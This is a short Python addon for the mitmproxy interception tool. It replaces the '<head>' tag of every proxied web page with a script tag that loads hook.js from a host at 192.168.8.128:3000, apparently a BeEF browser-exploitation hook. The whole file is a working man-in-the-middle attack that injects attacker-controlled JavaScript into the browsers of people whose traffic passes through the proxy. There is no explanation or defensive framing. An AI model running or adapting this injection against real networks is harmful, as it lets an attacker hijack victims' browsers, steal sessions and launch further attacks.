from mitmproxy import ctx
from mitmproxy import http

def response(flow: http.HTTPFlow):
        reflector = bytes("<script src='http://192.168.8.128:3000/hook.js'></script>", "UTF-8")
        flow.response.content = flow.response.content.replace(b"<head>", reflector)
